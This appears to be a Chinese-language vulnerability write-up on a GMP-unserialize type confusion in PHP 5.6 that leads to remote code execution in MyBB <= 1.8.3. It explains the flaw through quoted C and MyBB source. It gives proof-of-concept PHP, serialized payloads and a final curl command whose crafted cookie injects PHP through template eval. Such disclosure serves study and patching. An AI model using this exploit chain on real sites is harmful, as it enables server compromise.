<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>MyBB&lt;=1.8.3 RCE</h1><h2>一、漏洞简介</h2><p>在使用精心编制的对象的__wakeup()魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。</p><h2>二、漏洞影响</h2><p>PHP 5.6 &lt; 5.6.30</p><p>MyBB&lt;=1.8.3</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>gmp.c</p><p>static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */<br />{<br />    ...<br />    ALLOC_INIT_ZVAL(zv_ptr);<br />    if (!php_var_unserialize(&amp;zv_ptr, &amp;p, max, &amp;unserialize_data TSRMLS_CC)<br />        || Z_TYPE_P(zv_ptr) != IS_ARRAY<br />    ) {<br />        zend_throw_exception(NULL, "Could not unserialize properties", 0 TSRMLS_CC);<br />        goto exit;<br />    }<br /><br />    if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {<br />        zend_hash_copy(<br />            zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),<br />            (copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)<br />        );<br />    }</p><p>zend_object_handlers.c</p><p>ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */<br />{<br />    zend_object *zobj;<br />    zobj = Z_OBJ_P(object);<br />    if (!zobj-&gt;properties) {<br />        rebuild_object_properties(zobj);<br />    }<br />    return zobj-&gt;properties;<br />}</p><p>攻击者可以将**object更改为整数类型或bool类型的ZVAL，然后攻击者将能够通过Z_OBJ_P访问存储在对象库中的任何对象。这意味着攻击者将能够通过zend_hash_copy()更新对象中的任何属性。从而引发了一系列安全问题。</p><p>下面这段代码可以验证这个漏洞</p><p>&lt;?php<br /><br />class obj<br />{<br />    var $ryat;<br /><br />    function __wakeup()<br />    {<br />        $this-&gt;ryat = 1;<br />    }<br />}<br /><br />$obj = new stdClass;<br />$obj-&gt;aa = 1;<br />$obj-&gt;bb = 2;<br /><br />$inner = 's:1:&quot;1&quot;;a:3:{s:2:&quot;aa&quot;;s:2:&quot;hi&quot;;s:2:&quot;bb&quot;;s:2:&quot;hi&quot;;i:0;O:3:&quot;obj&quot;:1:{s:4:&quot;ryat&quot;;R:2;}}';<br />$exploit = 'a:1:{i:0;C:3:&quot;GMP&quot;:'.strlen($inner).':{'.$inner.'}}';<br />$x = unserialize($exploit);<br />var_dump($obj);<br /><br />?&gt;</p><p>预期结果:</p><p>object(stdClass)#1 (2) {<br />  ["aa"]=&gt;<br />  int(1)<br />  ["bb"]=&gt;<br />  int(2)<br />}</p><p>实际结果:</p><p>object(stdClass)#1 (3) {<br />  ["aa"]=&gt;<br />  string(2) "hi"<br />  ["bb"]=&gt;<br />  string(2) "hi"<br />  [0]=&gt;<br />  object(obj)#3 (1) {<br />    ["ryat"]=&gt;<br />    &amp;int(1)<br />  }<br />}</p><h3>漏洞利用</h3><p>在php 5.6&lt;=5.6.11中，DateInterval的__wakeup()使用convert_to_long()句柄并重新分配其属性，因此攻击者可以通过GMP的gmp_cast_object()将GMP对象转换成任何整数类型的ZVAL:</p><p>static int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */<br />{<br />    mpz_ptr gmpnum;<br />    switch (type) {<br />    ...<br />    case IS_LONG:<br />        gmpnum = GET_GMP_FROM_ZVAL(readobj);<br />        INIT_PZVAL(writeobj);<br />        ZVAL_LONG(writeobj, mpz_get_si(gmpnum));<br />        return SUCCESS;</p><p>漏洞利用代码</p><p>&lt;?php<br /><br />var_dump(unserialize('a:2:{i:0;C:3:&quot;GMP&quot;:17:{s:4:&quot;1234&quot;;a:0:{}}i:1;O:12:&quot;DateInterval&quot;:1:{s:1:&quot;y&quot;;R:2;}}'));<br /><br />?&gt;</p><p>当然，也可以套用精心编制的__wakeup()</p><p>&lt;?php<br /><br />function __wakeup()<br />{<br />    $this-&gt;ryat = (int) $this-&gt;ryat;<br />}<br /><br />?&gt;</p><h4><em>MyBB &lt;= 1.8.3</em></h4><p>index.php</p><p>if(isset($mybb-&gt;cookies['mybb']['forumread']))<br />    {<br />        $forumsread = my_unserialize($mybb-&gt;cookies['mybb']['forumread']);<br />    }</p><p>MyBB&lt;=1.8.3允许通过unserialize()反序列化cookie，因此攻击者能够更新$mybb或其他对象的属性，从而很容易导致安全问题，例如：XSS、SQL注入、RCE等 好消息是该漏洞已经在新版本得到了修复</p><h3>PoC</h3><p>MyBB &lt;= 1.8.3 RCE漏洞</p><p>index.php</p><p>eval('$index = &quot;'.$templates-&gt;get('index').'&quot;;');</p><p>MyBB在模板解析过程中始终使用eval()函数。 inc/class_templates.php</p><p>class templates<br />{<br />    ...<br />    public $cache = array();<br />    ...<br />    function get($title, $eslashes=1, $htmlcomments=1)<br />    {<br />        global $db, $theme, $mybb;<br />        ...<br />        $template = $this-&gt;cache[$title];<br />        ...<br />        return $template;<br />    }</p><p>如果我们可以控制$cache，我们就可以通过eval()函数注入php代码。 inc/init.php</p><p>$error_handler = new errorHandler();<br />...<br />$maintimer = new timer();<br />...<br />$mybb = new MyBB;<br />...<br />switch($config['database']['type'])<br />{<br />    case "sqlite":<br />        $db = new DB_SQLite;<br />        break;<br />    case "pgsql":<br />        $db = new DB_PgSQL;<br />        break;<br />    case "mysqli":<br />        $db = new DB_MySQLi;<br />        break;<br />    default:<br />        $db = new DB_MySQL;<br />}<br />...<br />$templates = new templates;</p><p>$templates对象在init.php中实例化，并且在此之前实例化了四个对象。这意味着$templates对象的句柄被设置为5并存储到对象存储中，因此我们可以访问$templates对象并通过在GMP反序列化期间将GMP对象转换为整型ZVAL(其值为5)来更新$cache属性。这也表明我们可以通过eval()函数注入php代码。</p><p>当MyBB&lt;=1.8.3和PHP5.6&lt;=5.6.11时，只需在命令行上使用curl即可触发RCE：</p><p>curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:&quot;GMP&quot;:106:{s:1:&quot;5&quot;%3ba:2:{s:5:&quot;cache&quot;%3ba:1:{s:5:&quot;index&quot;%3bs:14:&quot;{${phpinfo()}}&quot;%3b}i:0%3bO:12:&quot;DateInterval&quot;:1:{s:1:&quot;y&quot;%3bR:2%3b}}}}' http://0-sec.org/mybb</p></body></html>